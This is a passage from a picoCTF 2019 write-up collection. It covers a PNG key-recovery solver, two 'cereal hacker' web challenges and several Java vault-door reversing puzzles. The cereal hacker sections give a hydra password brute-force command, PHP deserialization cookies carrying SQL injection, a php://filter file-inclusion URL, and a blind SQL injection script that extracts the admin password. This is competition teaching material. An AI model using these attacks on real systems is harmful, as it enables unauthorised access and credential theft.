        img.save(&quot;{}.png&quot;.format(key))
        print(&quot;key is {}&quot;.format(key))
    except IOError:
        pass

shifters = []
for i in range(KEY_LEN):
    shifters.append([])

expected = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]
with open(&quot;bytes.txt&quot;) as f:
    bytes_arr = list(map(int, f.read().split(&quot; &quot;)))
    for i in range(KEY_LEN):
        for shifter in range(10):
            j = 0
            offset = (((j + shifter) * KEY_LEN) % len(bytes_arr)) + i
            if bytes_arr[offset] == expected[i]:
                shifters[i].append(shifter)               

for p in itertools.product(*shifters):
    key = &quot;&quot;.join(&quot;{}0&quot;.format(n) for n in p)
    create_png(bytes_arr, key, &quot;out&quot;)
</code></pre>
<p>This gives a key of <code>80802090204020407030306000408060</code>, and an image 
<img src="web/15-Java-Script-Kiddie-2/./80802090204020407030306000408060.png" alt="" /></p>
<p>Using the same decoder as last time, we get <code>picoCTF{f1ee7ff44419a675d1a0f0a1a91dff4c}</code></p>
<hr />
<p>Script adapted from <a href="https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Java_Script_Kiddie_2.md">Dvd848</a></p>
<h1><a class="header" href="#cereal-hacker-1" id="cereal-hacker-1">cereal hacker 1</a></h1>
<p>To start, we actualy need to use brute force. Use <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt">these</a> <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">lists</a> to guide you.</p>
<p>First download the word lists. Then we can use the <a href="https://github.com/vanhauser-thc/thc-hydra">hydra tool</a> to try to guess the password.</p>
<p>The command is <code>hydra -L top-usernames-shortlist.txt -P 10-million-password-list-top-10000.txt -v http-post-form://2019shell1.picoctf.com:49879/&quot;index.php?file=login:user=^USER^&amp;pass=^PASS^:Invalid Login&quot;</code></p>
<ul>
<li><code>hydra</code>: use the <a href="https://github.com/vanhauser-thc/thc-hydra">hydra password guesser</a></li>
<li><code>-L top-usernames-shortlist.txt</code>: get usernames from <a href="ttps://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt"><code>top-usernames-shortlist.txt</code></a></li>
<li><code>-P 10-million-password-list-top-10000.txt</code>: get passwords from <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"><code>10-million-password-list-top-10000.txt</code></a></li>
<li><code>-v</code>: verbose output</li>
<li><code>http-post-form</code>: were guessing over http, specifily post on a form</li>
<li><code>2019shell1.picoctf.com:49879</code> guess to port 49879 on 2019shell1.picoctf.com</li>
<li><code>&quot;index.php?file=login:user=^USER^&amp;pass=^PASS^:Invalid Login&quot;</code>: guess to <code>index.php?file=login</code> with user and password from the wordlist, and output when you <em>don't</em> see &quot;Invalid Login&quot;</li>
</ul>
<p>This takes about 1/2 an hour to give</p>
<pre><code class="language-text">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-08 11:20:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 170000 login tries (l:17/p:10000), ~10625 tries per task
[DATA] attacking http-post-form://2019shell1.picoctf.com:49879/index.php?file=login:user=^USER^&amp;pass=^PASS^:Invalid Login
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 1361.00 tries/min, 1361 tries in 00:01h, 168639 to do in 02:04h, 16 active
[STATUS] 1371.67 tries/min, 4115 tries in 00:03h, 165885 to do in 02:01h, 16 active
[STATUS] 1366.29 tries/min, 9564 tries in 00:07h, 160436 to do in 01:58h, 16 active
[STATUS] 1364.60 tries/min, 20469 tries in 00:15h, 149531 to do in 01:50h, 16 active
[VERBOSE] Page redirected to http://2019shell1.picoctf.com:49879/index.php?file=login
[VERBOSE] Page redirected to http://2019shell1.picoctf.com:49879/index.php?file=regular_user
[49879][http-post-form] host: 2019shell1.picoctf.com   login: guest   password: guest
^C[ERROR] Received signal 2, going down ...
The session file ./hydra.restore was written. Type &quot;hydra -R&quot; to resume session.
</code></pre>
<p>I'm not sure if this was intended. In the competition I got these details as someone put them in the discord, and the admins seemed to be fine with it.</p>
<p>Anyway now we can log in as <code>guest</code> with password <code>guest</code>. This gives us a cookie <code>user_info</code> with contents <code>TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D</code>. Decoding with <code>base64</code> we get <code>O:11:&quot;permissions&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:8:&quot;password&quot;;s:5:&quot;guest&quot;;}</code>. </p>
<p>This seems like some strange php serialisation format. Anyway we want admin, so let's try a sql injection.</p>
<pre><code>O:11:&quot;permissions&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:9:&quot;'or'1'='1&quot;;}
</code></pre>
<p>Note we have to change the lenght on the password.</p>
<p>Now we encode this back up with base64 to get <code>TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFz c3dvcmQiO3M6OToiJ29yJzEnPScxIjt9Cg==</code>.</p>
<p>Put this in as our cookie and after navigating to <a href="https://2019shell1.picoctf.com/problem/12279/index.php?file=admin"><code>index.php?file=admin</code></a> we get the flag.</p>
<p>Flag: <code>picoCTF{3fba6964d680deb73b38b7f2916df7d5}</code></p>
<h1><a class="header" href="#cereal-hacker-2" id="cereal-hacker-2">cereal hacker 2</a></h1>
<p>This time we start by leaking the source code.</p>
<p>For example <code>https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/read=convert.base64-encode/resource=admin</code> Returns</p>
<pre><code>PD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0pICYmICRwZXJtLT5pc19hZG1pbigpKXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPldlbGNvbWUgdG8gdGhlIGFkbWluIHBhZ2UhPC9oNT4KCQkJCQkJCTxoNSBzdHlsZT0iY29sb3I6Ymx1ZSIgY2xhc3M9InRleHQtY2VudGVyIj5GbGFnOiBGaW5kIHRoZSBhZG1pbidzIHBhc3N3b3JkITwvaDU+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoKCTwvYm9keT4KCjw/cGhwCn0KZWxzZXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPllvdSBhcmUgbm90IGFkbWluITwvaDU+CgkJCQkJCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPgoJCQkJCQkJCTxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLXByaW1hcnkgYnRuLWJsb2NrIHRleHQtdXBwZXJjYXNlIiBuYW1lPSJmaWxlIiB2YWx1ZT0ibG9naW4iIHR5cGU9InN1Ym1pdCIgb25jbGljaz0iZG9jdW1lbnQuY29va2llPSd1c2VyX2luZm89OyBleHBpcmVzPVRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MTggR01UOyBkb21haW49OyBwYXRoPS87JyI+R28gYmFjayB0byBsb2dpbjwvYnV0dG9uPgoJCQkJCQkJPC9mb3JtPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8P3BocAp9Cj8+Cg==
</code></pre>
<p>This is <a href="https://wiki.owasp.org/index.php/Testing_for_Local_File_Inclusion">Local file inclusion</a></p>
<pre><code class="language-php">&lt;?php

require_once('cookie.php');

if(isset($perm) &amp;&amp; $perm-&gt;is_admin()){
?&gt;
	
	&lt;body&gt;
		&lt;div class=&quot;container&quot;&gt;
			&lt;div class=&quot;row&quot;&gt;
				&lt;div class=&quot;col-sm-9 col-md-7 col-lg-5 mx-auto&quot;&gt;
					&lt;div class=&quot;card card-signin my-5&quot;&gt;
						&lt;div class=&quot;card-body&quot;&gt;
							&lt;h5 class=&quot;card-title text-center&quot;&gt;Welcome to the admin page!&lt;/h5&gt;
							&lt;h5 style=&quot;color:blue&quot; class=&quot;text-center&quot;&gt;Flag: Find the admin's password!&lt;/h5&gt;
						&lt;/div&gt;
					&lt;/div&gt;
				&lt;/div&gt;
			&lt;/div&gt;
		&lt;/div&gt;

	&lt;/body&gt;

&lt;?php
}
else{
?&gt;
	
	&lt;body&gt;
		&lt;div class=&quot;container&quot;&gt;
			&lt;div class=&quot;row&quot;&gt;
				&lt;div class=&quot;col-sm-9 col-md-7 col-lg-5 mx-auto&quot;&gt;
					&lt;div class=&quot;card card-signin my-5&quot;&gt;
						&lt;div class=&quot;card-body&quot;&gt;
							&lt;h5 class=&quot;card-title text-center&quot;&gt;You are not admin!&lt;/h5&gt;
							&lt;form action=&quot;index.php&quot; method=&quot;get&quot;&gt;
								&lt;button class=&quot;btn btn-lg btn-primary btn-block text-uppercase&quot; name=&quot;file&quot; value=&quot;login&quot; type=&quot;submit&quot; onclick=&quot;document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'&quot;&gt;Go back to login&lt;/button&gt;
							&lt;/form&gt;
						&lt;/div&gt;
					&lt;/div&gt;
				&lt;/div&gt;
			&lt;/div&gt;
		&lt;/div&gt;

	&lt;/body&gt;

&lt;?php
}
?&gt;
</code></pre>
<p>This would sugest looking at <code>cookie.php</code>. We can do that the same way to get</p>
<pre><code class="language-php">&lt;?php

require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
class permissions
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this-&gt;username = $u;
		$this-&gt;password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn-&gt;connect_errno){
			die('Could not connect');
		}
		//$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this-&gt;username.'\' AND (password = \''.$this-&gt;password.'\');';
		
		if (!($prepared = $sql_conn-&gt;prepare(&quot;SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;&quot;))) {
		    die(&quot;SQL error&quot;);
		}

		$prepared-&gt;bind_param('ss', $this-&gt;username, $this-&gt;password);
	
		if (!$prepared-&gt;execute()) {
		    die(&quot;SQL error&quot;);
		}
		
		if (!($result = $prepared-&gt;get_result())) {
		    die(&quot;SQL error&quot;);
		}

		$r = $result-&gt;fetch_all();
		if($result-&gt;num_rows !== 1){
			$is_admin_val = 0;
		}
		else{
			$is_admin_val = (int)$r[0][0];
		}
		
		$sql_conn-&gt;close();
		return $is_admin_val;
	}
}

/* legacy login */
class siteuser
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this-&gt;username = $u;
		$this-&gt;password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn-&gt;connect_errno){
			die('Could not connect');
		}
		$q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this-&gt;username.'\' AND (password = \''.$this-&gt;password.'\');';
		
		$result = $sql_conn-&gt;query($q);
		if($result-&gt;num_rows != 1){
			$is_user_val = 0;
		}
		else{
			$is_user_val = 1;
		}
		
		$sql_conn-&gt;close();
		return $is_user_val;
	}
}


if(isset($_COOKIE['user_info'])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
	}
	catch(Exception $except){
		die('Deserialization error.');
	}
}

?&gt;
</code></pre>
<p>The <code>permissions</code> class uses a prepared statement that makes a SQL injection way harder. Luckily we still have the <code>siteuser</code> class with a vulnerable SQL statement.</p>
<p>To access the <code>siteuser</code> class instead of sending something like <code>O:11:&quot;permissions&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:9:&quot;'or'1'='1&quot;;}</code> we need <code>O:8:&quot;siteuser&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:9:&quot;'or'1'='1&quot;;}</code>.</p>
<p>This works because the <a href="https://www.php.net/manual/en/function.unserialize.php">unserialize</a> function can create an instance of any class it wants.</p>
<p>Encoding this to get a cookie of 
<code>Tzo4OiJzaXRldXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo4OiJwYXNzd29yZCI7czo5OiInb3InMSc9JzEiO30=</code>
we can access the admin page. </p>
<p>This confirms we can hit the bad SQL. However we also need to chain this with another way of leaking the admin password, which is the flag.</p>
<p>To do this we can use a query to see if the password is <code>LIKE</code> a certain string. This lets us guess char by char, instead of all at once. We also need the <code>BINARY</code> to make the query case sensitive.</p>
<pre><code class="language-python">import requests
import string
import base64


def try_pwd(password):
    print(&quot;Testing: {}&quot;.format(password))
    injection = &quot;' OR password LIKE BINARY '{}%&quot;.format(password)
    payload = 'O:8:&quot;siteuser&quot;:2:{{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:{}:&quot;{}&quot;;}}'.format(
        len(injection), injection).encode('utf-8')
    cookies = dict(user_info=base64.b64encode(payload).decode('utf-8'))
    r = requests.get(
        &quot;http://2019shell1.picoctf.com:62195/index.php?file=admin&quot;, cookies=cookies)
    return &quot;Welcome&quot; in r.text


alpha = string.digits + string.ascii_letters + '{}'

flag = &quot;&quot;
while True:
    for c in alpha:
        if try_pwd(flag + c):
            flag += c
            print(&quot;Match: {}&quot;.format(flag))
            break
    else:
        break

print(&quot;Flag: {}&quot;.format(flag))
</code></pre>
<p>This takes about 3 mins, most of which is spend waiting for the server</p>
<pre><code class="language-text">real	2m49.461s
user	0m3.797s
sys	0m0.692s
</code></pre>
<p>Flag: <code>picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}</code></p>
<hr />
<p>Adapted from <a href="https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/cereal_hacker_2.md">Dvd848</a></p>
<hr />
<p>Looking at <code>index.php</code> we can see the inclusion vulnerability. The <a href="https://www.php.net/manual/en/function.include.php">include docs</a> have a security warning for this sort of attack.</p>
<pre><code class="language-php">&lt;?php

if(isset($_GET['file'])){
	$file = $_GET['file'];
}
else{
	header('location: index.php?file=login');
	die();
}

if(realpath($file)){
	die();
}
else{
	include('head.php');
	if(!include($file.'.php')){
		echo 'Unable to locate '.$file.'.php';
	}
	include('foot.php');
}

?&gt;
</code></pre>
<h1><a class="header" href="#reverse-engineering" id="reverse-engineering">Reverse Engineering</a></h1>
<h1><a class="header" href="#vault-door-training" id="vault-door-training">vault-door-training</a></h1>
<p>A simple java program is given</p>
<pre><code class="language-java">import java.util.*;

class VaultDoorTraining {
    public static void main(String args[]) {
        VaultDoorTraining vaultDoor = new VaultDoorTraining();
        Scanner scanner = new Scanner(System.in); 
        System.out.print(&quot;Enter vault password: &quot;);
        String userInput = scanner.next();
	String input = userInput.substring(&quot;picoCTF{&quot;.length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println(&quot;Access granted.&quot;);
	} else {
	    System.out.println(&quot;Access denied!&quot;);
	}
   }

    // The password is below. Is it safe to put the password in the source code?
    // What if somebody stole our source code? Then they would know what our
    // password is. Hmm... I will think of some ways to improve the security
    // on the other doors.
    //
    // -Minion #9567
    public boolean checkPassword(String password) {
        return password.equals(&quot;w4rm1ng_Up_w1tH_jAv4_3b500738c12&quot;);
    }
}
</code></pre>
<p>It's easy to see from this the answer is <code>picoCTF{w4rm1ng_Up_w1tH_jAv4_3b500738c12}</code></p>
<h1><a class="header" href="#vault-door-1" id="vault-door-1">vault-door-1</a></h1>
<pre><code class="language-java">import java.util.*;

class VaultDoor1 {
    public static void main(String args[]) {
        VaultDoor1 vaultDoor = new VaultDoor1();
        Scanner scanner = new Scanner(System.in);
        System.out.print(&quot;Enter vault password: &quot;);
	String userInput = scanner.next();
	String input = userInput.substring(&quot;picoCTF{&quot;.length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println(&quot;Access granted.&quot;);
	} else {
	    System.out.println(&quot;Access denied!&quot;);
	}
    }

    // I came up with a more secure way to check the password without putting
    // the password itself in the source code. I think this is going to be
    // UNHACKABLE!! I hope Dr. Evil agrees...
    //
    // -Minion #8728
    public boolean checkPassword(String password) {
        return password.length() == 32 &amp;&amp;
               password.charAt(0)  == 'd' &amp;&amp;
               password.charAt(29) == '7' &amp;&amp;
               password.charAt(4)  == 'r' &amp;&amp;
               password.charAt(2)  == '5' &amp;&amp;
               password.charAt(23) == 'r' &amp;&amp;
               password.charAt(3)  == 'c' &amp;&amp;
               password.charAt(17) == '4' &amp;&amp;
               password.charAt(1)  == '3' &amp;&amp;
               password.charAt(7)  == 'b' &amp;&amp;
               password.charAt(10) == '_' &amp;&amp;
               password.charAt(5)  == '4' &amp;&amp;
               password.charAt(9)  == '3' &amp;&amp;
               password.charAt(11) == 't' &amp;&amp;
               password.charAt(15) == 'c' &amp;&amp;
               password.charAt(8)  == 'l' &amp;&amp;
               password.charAt(12) == 'H' &amp;&amp;
               password.charAt(20) == 'c' &amp;&amp;
               password.charAt(14) == '_' &amp;&amp;
               password.charAt(6)  == 'm' &amp;&amp;
               password.charAt(24) == '5' &amp;&amp;
               password.charAt(18) == 'r' &amp;&amp;
               password.charAt(13) == '3' &amp;&amp;
               password.charAt(19) == '4' &amp;&amp;
               password.charAt(21) == 'T' &amp;&amp;
               password.charAt(16) == 'H' &amp;&amp;
               password.charAt(27) == '3' &amp;&amp;
               password.charAt(30) == 'a' &amp;&amp;
               password.charAt(25) == '_' &amp;&amp;
               password.charAt(22) == '3' &amp;&amp;
               password.charAt(28) == 'b' &amp;&amp;
               password.charAt(26) == '0' &amp;&amp;
               password.charAt(31) == '0';
    }
}
</code></pre>
<p>While brute force is easy, it's nicer to sort it. Using something like <a href="https://code.visualstudio.com/docs/editor/codebasics#_column-box-selection">vscode's box select</a>, take the relevent portion of the java.</p>
<pre><code class="language-text">0)  == 'd
29) == '7
4)  == 'r
2)  == '5
23) == 'r
3)  == 'c
17) == '4
1)  == '3
7)  == 'b
10) == '_
5)  == '4
9)  == '3
11) == 't
15) == 'c
8)  == 'l
12) == 'H
20) == 'c
14) == '_
6)  == 'm
24) == '5
18) == 'r
13) == '3
19) == '4
21) == 'T
16) == 'H
27) == '3
30) == 'a
25) == '_
22) == '3
28) == 'b
26) == '0
31) == '0
</code></pre>
<p>Then you can pipe this into <code>sort --numeric-sort</code> to get:</p>
<pre><code>0)  == 'd
1)  == '3
2)  == '5
3)  == 'c
4)  == 'r
5)  == '4
6)  == 'm
7)  == 'b
8)  == 'l
9)  == '3
10) == '_
11) == 't
12) == 'H
13) == '3
14) == '_
15) == 'c
16) == 'H
17) == '4
18) == 'r
19) == '4
20) == 'c
21) == 'T
22) == '3
23) == 'r
24) == '5
25) == '_
26) == '0
27) == '3
28) == 'b
29) == '7
30) == 'a
31) == '0
</code></pre>
<p>A simple script or <a href="https://code.visualstudio.com/docs/editor/codebasics#_multiple-selections-multicursor">multicursor</a> will let you join the  last charecters.</p>
<p><code>d35cr4mbl3_tH3_cH4r4cT3r5_03b7a0</code>. Flag: <code>picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_03b7a0}</code></p>
<h1><a class="header" href="#vault-door-3" id="vault-door-3">vault-door-3</a></h1>
<p>Looking at the code, the important method is:</p>
<pre><code class="language-java">    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        char[] buffer = new char[32];
        int i;
        for (i=0; i&lt;8; i++) {
            buffer[i] = password.charAt(i);
        }
        for (; i&lt;16; i++) {
            buffer[i] = password.charAt(23-i);
        }
        for (; i&lt;32; i+=2) {
            buffer[i] = password.charAt(46-i);
        }
        for (i=31; i&gt;=17; i-=2) {
            buffer[i] = password.charAt(i);
        }
        String s = new String(buffer);
        return s.equals(&quot;jU5t_a_sna_3lpm16g84c_u_4_m0r846&quot;);
    }
</code></pre>
<p>Some basic reversing to move the other way gives</p>
<pre><code class="language-java">import java.util.*;

class Sol {
    public static void main(String args[]) {
        char[] buffer = &quot;jU5t_a_sna_3lpm16g84c_u_4_m0r846&quot;.toCharArray();
        char[] password = new char[100];
        int i;
        for (i=0; i&lt;8; i++) {
            password[i] = buffer[i];
        }
        for (; i&lt;16; i++) {
            password[23-i]=buffer[i];
        }
        for (; i&lt;32; i+=2) {
            password[46-i]=buffer[i];
        }
        for (i=31; i&gt;=17; i-=2) {
            password[i]=buffer[i];
        }
        String s = new String(password);
        System.out.println(s);
    }
}
</code></pre>
<p>Then we can compile and run with <code>javac Sol.java &amp;&amp; java Sol</code> giving <code>jU5t_a_s1mpl3_an4gr4m_4_u_c08866</code></p>
<p>Flag: <code>picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_c08866}</code></p>
<h1><a class="header" href="#vault-door-4" id="vault-door-4">vault-door-4</a></h1>
<pre><code class="language-java">    public boolean checkPassword(String password) {
        byte[] passBytes = password.getBytes();
        byte[] myBytes = {
            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,
            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,
            0142, 0131, 0164, 063 , 0163, 0137, 0142, 071 ,
            'e' , '9' , '2' , 'f' , '7' , '6' , 'a' , 'c' ,
        };
        for (int i=0; i&lt;32; i++) {
            if (passBytes[i] != myBytes[i]) {
                return false;
            }
        }
        return true;
    }
</code></pre>
<p>We can just convert the bytes to string and be done.</p>
<pre><code class="language-java">        byte[] myBytes = {
            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,
            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,
            0142, 0131, 0164, 063 , 0163, 0137, 0142, 071 ,
            'e' , '9' , '2' , 'f' , '7' , '6' , 'a' , 'c' ,
        };
        String password = new String(myBytes);
        System.out.println(password);
</code></pre>
<p>Running gives <code>jU5t_4_bUnCh_0f_bYt3s_b9e92f76ac</code></p>
<p>Flag: <code>picoCTF{jU5t_4_bUnCh_0f_bYt3s_b9e92f76ac}</code></p>
<h1><a class="header" href="#vault-door-5" id="vault-door-5">vault-door-5</a></h1>
<pre><code class="language-java">import java.net.URLDecoder;
import java.util.*;

class VaultDoor5 {
    public static void main(String args[]) {
        VaultDoor5 vaultDoor = new VaultDoor5();
        Scanner scanner = new Scanner(System.in);
        System.out.print(&quot;Enter vault password: &quot;);
        String userInput = scanner.next();
	String input = userInput.substring(&quot;picoCTF{&quot;.length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println(&quot;Access granted.&quot;);
	} else {
	    System.out.println(&quot;Access denied!&quot;);
        }
    }

    // Minion #7781 used base 8 and base 16, but this is base 64, which is
    // like... eight times stronger, right? Riiigghtt? Well that's what my twin
    // brother Minion #2415 says, anyway.
    //
    // -Minion #2414
    public String base64Encode(byte[] input) {
        return Base64.getEncoder().encodeToString(input);
    }

    // URL encoding is meant for web pages, so any double agent spies who steal
    // our source code will think this is a web site or something, defintely not
    // vault door! Oh wait, should I have not said that in a source code
    // comment?
    //
    // -Minion #2415
    public String urlEncode(byte[] input) {
        StringBuffer buf = new StringBuffer();
        for (int i=0; i&lt;input.length; i++) {
            buf.append(String.format(&quot;%%%2x&quot;, input[i]));
        }
        return buf.toString();
    }

    public boolean checkPassword(String password) {
        String urlEncoded = urlEncode(password.getBytes());
        String base64Encoded = base64Encode(urlEncoded.getBytes());
        String expected = &quot;JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm&quot;
                        + &quot;JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2&quot;
                        + &quot;JTM0JTVmJTY0JTYxJTM4JTM4JTMyJTY0JTMwJTMx&quot;;
        return base64Encoded.equals(expected);
    }
}
</code></pre>
<p><code>JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTY0JTYxJTM4JTM4JTMyJTY0JTMwJTMx</code> is url encoded and then base64 encoded. </p>
<p>First using <code>base64 --decode</code> we get 
<code>%63%30%6e%76%33%72%74%31%6e%67%5f%66%72%30%6d%5f%62%61%35%65%5f%36%34%5f%64%61%38%38%32%64%30%31</code></p>
<p>Running it though a <a href="https://meyerweb.com/eric/tools/dencoder/">url decoder</a> we get <code>c0nv3rt1ng_fr0m_ba5e_64_da882d01</code></p>
<p>Flag: <code>picoCTF{c0nv3rt1ng_fr0m_ba5e_64_da882d01}</code></p>
<h1><a class="header" href="#vault-door-6" id="vault-door-6">vault-door-6</a></h1>
<pre><code class="language-java">    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        byte[] passBytes = password.getBytes();
        byte[] myBytes = {
            0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d,
            0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa ,
            0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27,
            0xa , 0x67, 0x6d, 0x33, 0x34, 0x6c, 0x60, 0x33,
        };
        for (int i=0; i&lt;32; i++) {
            if (((passBytes[i] ^ 0x55) - myBytes[i]) != 0) {
                return false;
            }
        }
        return true;
    }
</code></pre>
<p>This uses the <code>^</code> (<a href="https://www.geeksforgeeks.org/bitwise-operators-in-java/">bitwise XOR</a>).</p>
<p>As the clue tells us <code>X ^ Y = Z</code> imply <code>Z ^ Y = X</code>. Therefor we can bitwise XOR the bytes with <code>0x55</code> to get the password.</p>
<pre><code class="language-java">        byte[] myBytes = {
            0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d,
            0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa ,
            0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27,
            0xa , 0x67, 0x6d, 0x33, 0x34, 0x6c, 0x60, 0x33,
        };
        byte[] password = new byte[32];
        for (int i=0; i&lt;32; i++) {
            password[i] = (byte)(myBytes[i] ^ 0x55);
        }
        System.out.println(new String(password));
</code></pre>
<p>gives <code>n0t_mUcH_h4rD3r_tH4n_x0r_28fa95f</code></p>
<p>Flag: <code>picoCTF{n0t_mUcH_h4rD3r_tH4n_x0r_28fa95f}</code></p>
<h1><a class="header" href="#vault-door-7" id="vault-door-7">vault-door-7</a></h1>
<pre><code class="language-java">    public int[] passwordToIntArray(String hex) {
        int[] x = new int[8];
        byte[] hexBytes = hex.getBytes();
        for (int i=0; i&lt;8; i++) {
            x[i] = hexBytes[i*4]   &lt;&lt; 24
                 | hexBytes[i*4+1] &lt;&lt; 16
                 | hexBytes[i*4+2] &lt;&lt; 8
                 | hexBytes[i*4+3];
        }
        return x;
    }

    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        int[] x = passwordToIntArray(password);
        return x[0] == 1096770097
            &amp;&amp; x[1] == 1952395366
            &amp;&amp; x[2] == 1600270708
            &amp;&amp; x[3] == 1601398833
            &amp;&amp; x[4] == 1716808014
            &amp;&amp; x[5] == 1734293815
            &amp;&amp; x[6] == 1667379558
            &amp;&amp; x[7] == 859191138;
    }
</code></pre>
<p>We can reverse this with the <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.p32"><code>p32</code></a> packing function</p>
<pre><code class="language-python">&gt;&gt;&gt; from pwn import *
&gt;&gt;&gt; l = [1096770097,1952395366,1600270708,1601398833,1716808014,1734293815,1667379558,859191138]
&gt;&gt;&gt; b&quot;&quot;.join(p32(i, endian='big') for i in l)
b'A_b1t_0f_b1t_sh1fTiNg_97cb1f367b'
</code></pre>
<p>Flag: <code>picoCTF{A_b1t_0f_b1t_sh1fTiNg_97cb1f367b}</code></p>
<h1><a class="header" href="#vault-door-8" id="vault-door-8">vault-door-8</a></h1>
<pre><code class="language-java">// These pesky special agents keep reverse engineering our source code and then
// breaking into our secret vaults. THIS will teach those sneaky sneaks a
// lesson.
//
// -Minion #0891
import java.util.*; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec;
import java.security.*; class VaultDoor8 {public static void main(String args[]) {
Scanner b = new Scanner(System.in); System.out.print(&quot;Enter vault password: &quot;);
String c = b.next(); String f = c.substring(8,c.length()-1); VaultDoor8 a = new VaultDoor8(); if (a.checkPassword(f)) {System.out.println(&quot;Access granted.&quot;); }
